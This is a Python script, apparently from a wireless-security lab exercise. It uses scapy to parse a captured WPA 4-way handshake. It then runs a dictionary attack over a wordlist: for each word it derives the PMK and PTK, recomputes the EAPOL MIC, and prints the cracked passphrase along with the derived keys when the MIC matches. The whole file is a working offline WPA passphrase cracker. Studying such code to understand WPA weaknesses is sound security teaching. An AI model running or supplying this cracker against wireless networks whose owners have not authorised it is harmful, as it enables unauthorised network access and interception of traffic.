#!/usr/bin/env python
# -*- coding: utf-8 -*-

from scapy.all import *
from wpa_key_derivation import *
from binascii import a2b_hex, b2a_hex
from pbkdf2 import *
from numpy import array_split
from numpy import array
import hmac, hashlib

words = open('superdico.txt', 'r').readlines()
wpa=rdpcap("wpa_handshake.cap")
A           = "Pairwise key expansion" #this string is used in the pseudo-random function


#Association Request Info
ssid, APmac, Clientmac = getAssocReqInfo(wpa)
# get handshake messages
handshake = getHandshakeMessages(wpa)

if len(handshake) != 4:
    print("Incomplete handshake. Quitting...")
    exit()

# Authenticator and Supplicant Nonces, MIC
ANonce, SNonce, mic_to_test = getNouncesAndMic(handshake)

# End Set to 0 based on the "Quelques éléments à considérer" :D
data = getDataFromPacket(handshake[3]) + b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00' #a2b_hex("0103005f02030a0000000000000000000100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000")
B = min(APmac,Clientmac)+max(APmac,Clientmac)+min(ANonce,SNonce)+max(ANonce,SNonce) #used in pseudo-random function



ssid = str.encode(ssid)
for word in words:
    word = word.strip()
    #calculate 4096 rounds to obtain the 256 bit (32 oct) PMK
    passPhrase = str.encode(word)
    
    pmk = pbkdf2(hashlib.sha1,passPhrase, ssid, 4096, 32)

    #expand pmk to obtain PTK
    ptk = customPRF512(pmk,str.encode(A),B)

    #calculate MIC over EAPOL payload (Michael)- The ptk is, in fact, KCK|KEK|TK|MICK
    mic = hmac.new(ptk[0:16],data,hashlib.sha1)

    #FROM: https://python.readthedocs.io/en/stable/library/hmac.html#hmac.HMAC.hexdigest
    if mic.hexdigest()[0:32] == mic_to_test.decode():
        print ("\nResults of the key expansion")
        print ("=============================")
        print ("PMK:\t\t",pmk.hex(),"\n")
        print ("PTK:\t\t",ptk.hex(),"\n")
        print ("KCK:\t\t",ptk[0:16].hex(),"\n")
        print ("KEK:\t\t",ptk[16:32].hex(),"\n")
        print ("TK:\t\t",ptk[32:48].hex(),"\n")
        print ("MICK:\t\t",ptk[48:64].hex(),"\n")
        print ("MIC:\t\t",mic.hexdigest(),"\n")
        print ("Valid passphrase found with the value : " + word)
        break
    else :
        # Ugly with a real dictionnary but we display that for the sake of the debug :D
        print ("Tried with passphrase = " + word + " but that was a failure :(")